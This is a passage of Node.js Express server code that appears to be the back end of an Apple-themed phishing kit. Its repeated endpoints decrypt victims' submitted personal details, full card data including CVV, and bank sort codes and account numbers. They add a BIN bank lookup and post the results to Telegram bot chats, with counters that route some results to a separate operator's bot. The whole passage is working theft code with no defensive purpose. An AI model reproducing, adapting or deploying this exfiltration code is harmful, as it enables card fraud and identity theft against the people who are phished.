      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (heisenberg == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        heisenberg = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleHeisenberg:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5009877290,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        heisenberg += 1;
      }
      res.send("Update Complete");
    });
});

let pablo = 0;

app.options("/pabloApple", cors());

app.post("/pabloApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pablo == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        heisenberg = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `ApplePablo:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 784539021,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        heisenberg += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/sendMazzaAppleRes", cors());

let mazCount = 3;

app.post("/sendMazzaAppleRes", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mazCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mazCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Apple:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Apple:\n${originalText}`
        );
        mazCount += 1;
      }
    });
});

app.options("/sendStrictlyAppleRes", cors());

app.post("/sendStrictlyAppleRes", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (count === 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        count = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1921026559&text=Apple:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5266729262&text=Apple:\n${originalText}`
        );
        count = count + 1;
      }
    });
});

let sbCount = 15;

let pastebk = 0;

app.options("/applePasteBk", cors());

app.post("/applePasteBk", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pastebk == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5358629321,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/applePoka", cors());

app.post("/applePoka", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pastebk == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5280917183,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk += 1;
      }
      res.send("Update Complete");
    });
});

let firstTrust = 0;

app.options("/appleFirstTrust", cors());

app.post("/appleFirstTrust", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (firstTrust == 100) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        firstTrust = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 837638060,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        firstTrust += 1;
      }
      res.send("Update Complete");
    });
});

app.options("/appleSB", cors());

app.post("/appleSB", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (sbCount == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        sbCount = 9;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5450405437&text=Apple:\n${originalText}`
        );
        sbCount += 1;
      }
      res.send("Update Complete");
    });
});

let p2 = 0;

app.options("/appleP2", cors());

app.post("/appleP2", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (p2 == 15) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        p2 = 9;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleP2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1265611993,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
